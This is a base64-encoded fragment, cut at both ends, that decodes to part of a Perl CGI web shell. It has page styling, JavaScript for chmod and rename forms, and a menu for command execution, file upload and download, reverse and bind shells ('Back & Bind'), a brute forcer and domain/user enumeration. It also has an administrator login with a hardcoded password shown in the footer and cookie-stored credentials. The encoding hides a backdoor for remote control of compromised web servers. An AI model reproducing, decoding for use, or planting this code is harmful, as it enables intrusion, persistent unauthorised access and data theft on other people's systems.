wLjNlbSBjeWFuOw0KY29sb3I6ICNGRkZGRkY7DQpib3JkZXItY29sb3I6ICMwMDk5MDA7DQp9DQpjb2RlIHsNCmJvcmRlcjogZGFzaGVkIDBweCAjMzMzOw0KY29sb3I6IHdoaWxlOw0KfQ0KcnVuIHsNCmJvcmRlcgkJCTogZGFzaGVkIDBweCAjMzMzOw0KY29sb3I6ICNGRjAwQUE7DQp9DQp0ZXh0YXJlYSB7DQpCQUNLR1JPVU5ELUNPTE9SOiAjMWIxYjFiOw0KZm9udDogRml4ZWRzeXMgYm9sZDsNCmNvbG9yOiAjYWFhOw0KfQ0KQTpsaW5rIHsNCglDT0xPUjogI2ZmZmZmZjsgVEVYVC1ERUNPUkFUSU9OOiBub25lDQp9DQpBOnZpc2l0ZWQgew0KCUNPTE9SOiAjZmZmZmZmOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6aG92ZXIgew0KCXRleHQtc2hhZG93OiAwcHQgMHB0IDAuM2VtIGN5YW4sIDBwdCAwcHQgMC4zZW0gY3lhbjsNCgljb2xvcjogI0ZGRkZGRjsgVEVYVC1ERUNPUkFUSU9OOiBub25lDQp9DQpBOmFjdGl2ZSB7DQoJY29sb3I6IFJlZDsgVEVYVC1ERUNPUkFUSU9OOiBub25lDQp9DQoubGlzdGRpciB0cjpob3ZlcnsNCgliYWNrZ3JvdW5kOiAjNDQ0Ow0KfQ0KLmxpc3RkaXIgdHI6aG92ZXIgdGR7DQoJYmFja2dyb3VuZDogIzQ0NDsNCgl0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47DQoJY29sb3I6ICNGRkZGRkY7IFRFWFQtREVDT1JBVElPTjogbm9uZTsNCn0NCi5ub3RsaW5lew0KCWJhY2tncm91bmQ6ICMxMTE7DQp9DQoubGluZXsNCgliYWNrZ3JvdW5kOiAjMjIyOw0KfQ0KPC9zdHlsZT4NCjxzY3JpcHQgbGFuZ3VhZ2U9ImphdmFzY3JpcHQiPg0KZnVuY3Rpb24gRW5jb2RlcihuYW1lKQ0Kew0KCXZhciBlID0gIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKG5hbWUpOw0KCWUudmFsdWUgPSBidG9hKGUudmFsdWUpOw0KCXJldHVybiB0cnVlOw0KfQ0KZnVuY3Rpb24gY2htb2RfZm9ybShpLGZpbGUpDQp7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVQZXJtc18iK2kpLmlubmVySFRNTD0iPGZvcm0gbmFtZT1Gb3JtUGVybXNfIiArIGkrICIgYWN0aW9uPScnIG1ldGhvZD0nUE9TVCc+PGlucHV0IGlkPXRleHRfIiArIGkgKyAiICBuYW1lPWNobW9kIHR5cGU9dGV4dCBzaXplPTUgLz48aW5wdXQgdHlwZT1zdWJtaXQgY2xhc3M9J3N1Ym1pdCcgdmFsdWU9T0s+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YSB2YWx1ZT0nZ3VpJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1kIHZhbHVlPSckRW5jb2RlQ3VycmVudERpcic+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZiB2YWx1ZT0nIitmaWxlKyInPjwvZm9ybT4iOw0KCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ0ZXh0XyIgKyBpKS5mb2N1cygpOw0KfQ0KZnVuY3Rpb24gcm1fY2htb2RfZm9ybShyZXNwb25zZSxpLHBlcm1zLGZpbGUpDQp7DQoJcmVzcG9uc2UuaW5uZXJIVE1MID0gIjxzcGFuIG9uY2xpY2s9XFxcImNobW9kX2Zvcm0oIiArIGkgKyAiLCciKyBmaWxlKyAiJylcXFwiID4iKyBwZXJtcyArIjwvc3Bhbj48L3RkPiI7DQp9DQpmdW5jdGlvbiByZW5hbWVfZm9ybShpLGZpbGUsZikNCnsNCglmLnJlcGxhY2UoL1xcXFwvZywiXFxcXFxcXFwiKTsNCgl2YXIgYmFjaz0icm1fcmVuYW1lX2Zvcm0oIitpKyIsXFxcIiIrZmlsZSsiXFxcIixcXFwiIitmKyJcXFwiKTsgcmV0dXJuIGZhbHNlOyI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9Ijxmb3JtIG5hbWU9Rm9ybVBlcm1zXyIgKyBpKyAiIGFjdGlvbj0nJyBtZXRob2Q9J1BPU1QnPjxpbnB1dCBpZD10ZXh0XyIgKyBpICsgIiAgbmFtZT1yZW5hbWUgdHlwZT10ZXh0IHZhbHVlPSAnIitmaWxlKyInIC8+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIHZhbHVlPU9LPjxpbnB1dCB0eXBlPXN1Ym1pdCBjbGFzcz0nc3VibWl0JyBvbmNsaWNrPSciICsgYmFjayArICInIHZhbHVlPUNhbmNlbD48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hIHZhbHVlPSdndWknPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWQgdmFsdWU9JyRFbmNvZGVDdXJyZW50RGlyJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1mIHZhbHVlPSciK2ZpbGUrIic+PC9mb3JtPiI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRleHRfIiArIGkpLmZvY3VzKCk7DQp9DQpmdW5jdGlvbiBybV9yZW5hbWVfZm9ybShpLGZpbGUsZikNCnsNCglpZihmPT0nZicpDQoJew0KCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZV8iK2kpLmlubmVySFRNTD0iPGEgaHJlZj0nP2E9Y29tbWFuZCZkPSRFbmNvZGVDdXJyZW50RGlyJmM9ZWRpdCUyMCIrZmlsZSsiJTIwJz4iICtmaWxlKyAiPC9hPiI7DQoJfWVsc2UNCgl7DQoJCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJGaWxlXyIraSkuaW5uZXJIVE1MPSI8YSBocmVmPSc/YT1ndWkmZD0iK2YrIic+WyAiICtmaWxlKyAiIF08L2E+IjsNCgl9DQp9DQo8L3NjcmlwdD4NCjxib2R5IG9uTG9hZD0iZG9jdW1lbnQuZi5AXy5mb2N1cygpIiBiZ2NvbG9yPSIjMGMwYzBjIiB0b3BtYXJnaW49IjAiIGxlZnRtYXJnaW49IjAiIG1hcmdpbndpZHRoPSIwIiBtYXJnaW5oZWlnaHQ9IjAiPg0KPGNlbnRlcj48Y29kZT4NCjx0YWJsZSBib3JkZXI9IjEiIHdpZHRoPSIxMDAlIiBjZWxsc3BhY2luZz0iMCIgY2VsbHBhZGRpbmc9IjIiPg0KPHRyPg0KCTx0ZCBhbGlnbj0iY2VudGVyIiByb3dzcGFuPTM+DQoJCTxiPjxmb250IHNpemU9IjMiPiRFZGl0UGVyc2lvbjwvZm9udD48L2I+DQoJPC90ZD4NCgk8dGQ+DQoJCSRpbmZvDQoJPC90ZD4NCgk8dGQ+U2VydmVyIElQOjxmb250IGNvbG9yPSJyZWQiPiAkRU5WeydTRVJWRVJfQUREUid9PC9mb250PiB8IFlvdXIgSVA6IDxmb250IGNvbG9yPSJyZWQiPiRFTlZ7J1JFTU9URV9BRERSJ308L2ZvbnQ+DQoJPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQgY29sc3Bhbj0iMiI+DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24iPkhvbWU8L2E+IHwgDQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1jb21tYW5kJmQ9JEVuY29kZUN1cnJlbnREaXIiPkNvbW1hbmQ8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWd1aSZkPSRFbmNvZGVDdXJyZW50RGlyIj5HVUk8L2E+IHwgDQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT11cGxvYWQmZD0kRW5jb2RlQ3VycmVudERpciI+VXBsb2FkIEZpbGU8L2E+IHwgDQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZkPSRFbmNvZGVDdXJyZW50RGlyIj5Eb3dubG9hZCBGaWxlPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1iYWNrYmluZCI+QmFjayAmIEJpbmQ8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWJydXRlZm9yY2VyIj5CcnV0ZSBGb3JjZXI8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWNoZWNrbG9nIj5DaGVjayBMb2c8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWRvbWFpbnN1c2VyIj5Eb21haW5zL1VzZXJzPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1sb2dvdXQiPkxvZ291dDwvYT4gfA0KPGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9Ii4uL2Vycm9yX2xvZy5waHAiPkhlbHA8L2E+DQo8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZCBjb2xzcGFuPSIyIj4NCiRpZA0KPC90ZD4NCjwvdHI+DQo8L3RhYmxlPg0KPGZvbnQgaWQ9IlJlc3BvbnNlRGF0YSIgY29sb3I9IiNGRkZGRkYiID4NCkVORA0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVlbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5TY3JlZW4NCnsNCglwcmludCA8PEVORDsNCjxwcmU+PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KVHlwaW5nVGV4dCA9IGZ1bmN0aW9uKGVsZW1lbnQsIGludGVydmFsLCBjdXJzb3IsIGZpbmlzaGVkQ2FsbGJhY2spIHsNCiAgaWYoKHR5cGVvZiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCA9PSAidW5kZWZpbmVkIikgfHwgKHR5cGVvZiBlbGVtZW50LmlubmVySFRNTCA9PSAidW5kZWZpbmVkIikpIHsNCiAgICB0aGlzLnJ1bm5pbmcgPSB0cnVlOwkvLyBOZXZlciBydW4uDQogICAgcmV0dXJuOw0KICB9DQogIHRoaXMuZWxlbWVudCA9IGVsZW1lbnQ7DQogIHRoaXMuZmluaXNoZWRDYWxsYmFjayA9IChmaW5pc2hlZENhbGxiYWNrID8gZmluaXNoZWRDYWxsYmFjayA6IGZ1bmN0aW9uKCkgeyByZXR1cm47IH0pOw0KICB0aGlzLmludGVydmFsID0gKHR5cGVvZiBpbnRlcnZhbCA9PSAidW5kZWZpbmVkIiA/IDEwMCA6IGludGVydmFsKTsNCiAgdGhpcy5vcmlnVGV4dCA9IHRoaXMuZWxlbWVudC5pbm5lckhUTUw7DQogIHRoaXMudW5wYXJzZWRPcmlnVGV4dCA9IHRoaXMub3JpZ1RleHQ7DQogIHRoaXMuY3Vyc29yID0gKGN1cnNvciA/IGN1cnNvciA6ICIiKTsNCiAgdGhpcy5jdXJyZW50VGV4dCA9ICIiOw0KICB0aGlzLmN1cnJlbnRDaGFyID0gMDsNCiAgdGhpcy5lbGVtZW50LnR5cGluZ1RleHQgPSB0aGlzOw0KICBpZih0aGlzLmVsZW1lbnQuaWQgPT0gIiIpIHRoaXMuZWxlbWVudC5pZCA9ICJ0eXBpbmd0ZXh0IiArIFR5cGluZ1RleHQuY3VycmVudEluZGV4Kys7DQogIFR5cGluZ1RleHQuYWxsLnB1c2godGhpcyk7DQogIHRoaXMucnVubmluZyA9IGZhbHNlOw0KICB0aGlzLmluVGFnID0gZmFsc2U7DQogIHRoaXMudGFnQnVmZmVyID0gIiI7DQogIHRoaXMuaW5IVE1MRW50aXR5ID0gZmFsc2U7DQogIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciA9ICIiOw0KfQ0KVHlwaW5nVGV4dC5hbGwgPSBuZXcgQXJyYXkoKTsNClR5cGluZ1RleHQuY3VycmVudEluZGV4ID0gMDsNClR5cGluZ1RleHQucnVuQWxsID0gZnVuY3Rpb24oKSB7DQogIGZvcih2YXIgaSA9IDA7IGkgPCBUeXBpbmdUZXh0LmFsbC5sZW5ndGg7IGkrKykgVHlwaW5nVGV4dC5hbGxbaV0ucnVuKCk7DQp9DQpUeXBpbmdUZXh0LnByb3RvdHlwZS5ydW4gPSBmdW5jdGlvbigpIHsNCiAgaWYodGhpcy5ydW5uaW5nKSByZXR1cm47DQogIGlmKHR5cGVvZiB0aGlzLm9yaWdUZXh0ID09ICJ1bmRlZmluZWQiKSB7DQogICAgc2V0VGltZW91dCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJyIgKyB0aGlzLmVsZW1lbnQuaWQgKyAiJykudHlwaW5nVGV4dC5ydW4oKSIsIHRoaXMuaW50ZXJ2YWwpOwkvLyBXZSBoYXZlbid0IGZpbmlzaGVkIGxvYWRpbmcgeWV0LiAgSGF2ZSBwYXRpZW5jZS4NCiAgICByZXR1cm47DQogIH0NCiAgaWYodGhpcy5jdXJyZW50VGV4dCA9PSAiIikgdGhpcy5lbGVtZW50LmlubmVySFRNTCA9ICIiOw0KLy8gIHRoaXMub3JpZ1RleHQgPSB0aGlzLm9yaWdUZXh0LnJlcGxhY2UoLzwoW148XSkqPi8sICIiKTsgICAgIC8vIFN0cmlwIEhUTUwgZnJvbSB0ZXh0Lg0KICBpZih0aGlzLmN1cnJlbnRDaGFyIDwgdGhpcy5vcmlnVGV4dC5sZW5ndGgpIHsNCiAgICBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiPCIgJiYgIXRoaXMuaW5UYWcpIHsNCiAgICAgIHRoaXMudGFnQnVmZmVyID0gIjwiOw0KICAgICAgdGhpcy5pblRhZyA9IHRydWU7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiPiIgJiYgdGhpcy5pblRhZykgew0KICAgICAgdGhpcy50YWdCdWZmZXIgKz0gIj4iOw0KICAgICAgdGhpcy5pblRhZyA9IGZhbHNlOw0KICAgICAgdGhpcy5jdXJyZW50VGV4dCArPSB0aGlzLnRhZ0J1ZmZlcjsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMuaW5UYWcpIHsNCiAgICAgIHRoaXMudGFnQnVmZmVyICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIiYiICYmICF0aGlzLmluSFRNTEVudGl0eSkgew0KICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyID0gIiYiOw0KICAgICAgdGhpcy5pbkhUTUxFbnRpdHkgPSB0cnVlOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIjsiICYmIHRoaXMuaW5IVE1MRW50aXR5KSB7DQogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgKz0gIjsiOw0KICAgICAgdGhpcy5pbkhUTUxFbnRpdHkgPSBmYWxzZTsNCiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy5IVE1MRW50aXR5QnVmZmVyOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5pbkhUTUxFbnRpdHkpIHsNCiAgICAgIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciArPSB0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKTsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIHsNCiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7DQogICAgfQ0KICAgIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgPSB0aGlzLmN1cnJlbnRUZXh0Ow0KICAgIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgKz0gKHRoaXMuY3VycmVudENoYXIgPCB0aGlzLm9yaWdUZXh0Lmxlbmd0aCAtIDEgPyAodHlwZW9mIHRoaXMuY3Vyc29yID09ICJmdW5jdGlvbiIgPyB0aGlzLmN1cnNvcih0aGlzLmN1cnJlbnRUZXh0KSA6IHRoaXMuY3Vyc29yKSA6ICIiKTsNCiAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgc2V0VGltZW91dCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJyIgKyB0aGlzLmVsZW1lbnQuaWQgKyAiJykudHlwaW5nVGV4dC5ydW4oKSIsIHRoaXMuaW50ZXJ2YWwpOw0KICB9IGVsc2Ugew0KCXRoaXMuY3VycmVudFRleHQgPSAiIjsNCgl0aGlzLmN1cnJlbnRDaGFyID0gMDsNCiAgICAgICAgdGhpcy5ydW5uaW5nID0gZmFsc2U7DQogICAgICAgIHRoaXMuZmluaXNoZWRDYWxsYmFjaygpOw0KICB9DQp9DQo8L3NjcmlwdD4NCjwvcHJlPg0KDQo8YnI+DQoNCjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4NCm5ldyBUeXBpbmdUZXh0KGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJoYWNrIiksIDMwLCBmdW5jdGlvbihpKXsgdmFyIGFyID0gbmV3IEFycmF5KCJfIiwiIik7IHJldHVybiAiICIgKyBhcltpLmxlbmd0aCAlIGFyLmxlbmd0aF07IH0pOw0KVHlwaW5nVGV4dC5ydW5BbGwoKTsNCg0KPC9zY3JpcHQ+DQpFTkQNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgZW5jb2RlIGh0bWwgc3BlY2lhbCBjaGFycw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFVybEVuY29kZSgkKXsNCglteSAkc3RyID0gc2hpZnQ7DQoJJHN0ciA9fiBzLyhbXkEtWmEtejAtOV0pL3NwcmludGYoIiUlJTAyWCIsIG9yZCgkMSkpL3NlZzsNCglyZXR1cm4gJHN0cjsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQWRkIGh0bWwgc3BlY2lhbCBjaGFycw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEh0bWxTcGVjaWFsQ2hhcnMoJCl7DQoJbXkgJHRleHQgPSBzaGlmdDsNCgkkdGV4dCA9fiBzLyYvJi9nOw0KCSR0ZXh0ID1+IHMvIi8iL2c7DQoJJHRleHQgPX4gcy8nLycvZzsNCgkkdGV4dCA9fiBzLzwvPC9nOw0KCSR0ZXh0ID1+IHMvPi8+L2c7DQoJcmV0dXJuICR0ZXh0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBBZGQgbGluayBmb3IgZGlyZWN0b3J5DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQWRkTGlua0RpcigkKQ0Kew0KCW15ICRhYz1zaGlmdDsNCglteSBAZGlyPSgpOw0KCWlmKCRXaW5OVCkNCgl7DQoJCUBkaXI9c3BsaXQoL1xcLywkQ3VycmVudERpcik7DQoJfWVsc2UNCgl7DQoJCUBkaXI9c3BsaXQoIi8iLCZ0cmltKCRDdXJyZW50RGlyKSk7DQoJfQ0KCW15ICRwYXRoPSIiOw0KCW15ICRyZXN1bHQ9IiI7DQoJZm9yZWFjaCAoQGRpcikNCgl7DQoJCSRwYXRoIC49ICRfLiRQYXRoU2VwOw0KCQkkcmVzdWx0Lj0iPGEgaHJlZj0nP2E9Ii4kYWMuIiZkPSIuZW5jb2RlX2Jhc2U2NCgkcGF0aCkuIic+Ii4kXy4kUGF0aFNlcC4iPC9hPiI7DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIG1lc3NhZ2UgdGhhdCBpbmZvcm1zIHRoZSB1c2VyIG9mIGEgZmFpbGVkIGxvZ2luDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpbkZhaWxlZE1lc3NhZ2UNCnsNCglwcmludCA8PEVORDsNCg0KDQpQYXNzd29yZDo8YnI+DQpMb2dpbiBpbmNvcnJlY3Q8YnI+PGJyPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gZm9yIGxvZ2dpbmcgaW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRm9ybQ0Kew0KCXByaW50IDw8RU5EOw0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0ibG9naW4iPg0KTG9naW4gOiBBZG1pbmlzdHJhdG9yPGJyPg0KUGFzc3dvcmQ6PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4NCjxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQo8L2Zvcm0+DQpFTkQNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBmb290ZXIgZm9yIHRoZSBIVE1MIFBhZ2UNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludFBhZ2VGb290ZXINCnsNCglwcmludCAiPGJyPg0KCTxmb250IGNvbG9yPXJlZD49PC9mb250Pjxmb250IGNvbG9yPXJlZD4tLS0+KiAgPGZvbnQgY29sb3I9I2ZmOTkwMD5QYXNzID0gNDkxNjI1IDwvZm9udD4gICo8LS0tPTwvZm9udD48L2NvZGU+DQo8L2NlbnRlcj48L2JvZHk+PC9odG1sPiI7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFJldHJlaXZlcyB0aGUgdmFsdWVzIG9mIGFsbCBjb29raWVzLiBUaGUgY29va2llcyBjYW4gYmUgYWNjZXNzZXMgdXNpbmcgdGhlDQojIHZhcmlhYmxlICRDb29raWVzeycnfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEdldENvb2tpZXMNCnsNCglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOw0KCWZvcmVhY2ggJGNvb2tpZShAaHR0cGNvb2tpZXMpDQoJew0KCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7DQoJCSRDb29raWVzeyRpZH0gPSAkdmFsOw0KCX0NCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBzY3JlZW4gd2hlbiB0aGUgdXNlciBsb2dzIG91dA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9nb3V0U2NyZWVuDQp7DQoJcHJpbnQgIkNvbm5lY3Rpb24gY2xvc2VkIGJ5IGZvcmVpZ24gaG9zdC48YnI+PGJyPiI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgTG9ncyBvdXQgdGhlIHVzZXIgYW5kIGFsbG93cyB0aGUgdXNlciB0byBsb2dpbiBhZ2Fpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFBlcmZvcm1Mb2dvdXQNCnsNCglwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9O1xuIjsgIyByZW1vdmUgcGFzc3dvcmQgY29va2llDQoJJlByaW50UGFnZUhlYWRlcigicCIpOw0KCSZQcmludExvZ291dFNjcmVlbjsNCg0KCSZQcmludExvZ2luU2NyZWVuOw0KCSZQcmludExvZ2luRm9ybTsNCgkmUHJpbnRQYWdlRm9vdGVyOw0KCWV4aXQ7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gbG9naW4gdGhlIHVzZXIuIElmIHRoZSBwYXNzd29yZCBtYXRjaGVzLCBpdA0KIyBkaXNwbGF5cyBhIHBhZ2UgdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gcnVuIGNvbW1hbmRzLiBJZiB0aGUgcGFzc3dvcmQgZG9lbnMndA0KIyBtYXRjaCBvciBpZiBubyBwYXNzd29yZCBpcyBlbnRlcmVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXINCiMgdG8gbG9naW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQZXJmb3JtTG9naW4gDQp7DQoJaWYoJExvZ2luUGFzc3dvcmQgZXEgJFBhc3N3b3JkKSAjIHBhc3N3b3JkIG1hdGNoZWQNCgl7DQoJCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD0kTG9naW5QYXNzd29yZDtcbiI7DQoJCSZQcmludFBhZ2VIZWFkZXI7DQoJCXByaW50ICZMaXN0RGlyOw0KCX0NC